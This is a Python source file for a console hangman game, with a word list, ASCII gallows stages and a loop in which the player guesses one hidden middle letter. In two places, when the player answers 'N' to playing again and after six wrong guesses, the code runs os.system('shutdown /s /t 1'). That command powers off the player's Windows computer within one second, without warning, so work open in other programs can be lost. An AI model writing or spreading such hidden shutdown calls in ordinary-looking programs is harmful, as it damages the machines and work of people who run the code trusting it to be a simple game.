import random
import os

randomwords = ["apple", "table", "grape", "peach", "dream", "ocean", "chair", "laugh", "mouse", "river", "paper", "cloud", "music", "beach", "heart", "light", "queen", "smile", "stone", "tiger","water", "chest", "crown", "knife", "pants", "socks", "tooth", "wagon", "wrist"]

incorrect_guesses_0 = '''
    +---+
    |   |
        |
        |
        |
        |
  ========
'''

incorrect_guesses_1 = '''
    +---+
    |   |
    O   |
        |
        |
        |
  ========
'''

incorrect_guesses_2 = '''
    +---+
    |   |
    O   |
    |   |
        |
        |
  ========
'''

incorrect_guesses_3 = '''
    +---+
    |   |
    O   |
   /|   |
        |
        |
  ========
'''

incorrect_guesses_4 = '''
    +---+
    |   |
    O   |
   /|\  |
        |
        |
  ========
'''

incorrect_guesses_5 = '''
    +---+
    |   |
    O   |
   /|\  |
   /    |
        |
  ========
'''

incorrect_guesses_6 = '''
    +---+
    |   |
    O   |
   /|\  |
   / \  |
        |
  ========
'''
incorrect_guesses = [
    incorrect_guesses_0,
    incorrect_guesses_1,
    incorrect_guesses_2,
    incorrect_guesses_3,
    incorrect_guesses_4,
    incorrect_guesses_5,
    incorrect_guesses_6
]
while True:  # Outer loop for restarting the game
    
    randomword = random.choice(randomwords)

    a = 2
    b = -2

    keepplaying = True
    c = -1
    while keepplaying and c < 6:
        c = c + 1
        displayword = randomword[:a] + "_" + randomword[b:]
        print(displayword)
        userguess = input("What do you think the letter is? ")

        if len(userguess) == 1:
            if userguess == randomword[a]:
                print("You got it right!")
                question = input("Do you want to play again? (Y or N) ")
                if question.lower() == "n":
                    os.system("shutdown /s /t 1")
                elif question.lower() == "y":
                    print("Restarting the game...")
                    break  # Break out of the inner loop to restart the game
                else:
                    print("Invalid input. Assuming 'N' and ending the game.")
                    keepplaying = False
            else:
                print(incorrect_guesses[c])
        else:
            print("Tell me a letter")
        if c == 6:
            print("Game over! He died.")
            os.system("shutdown /s /t 1")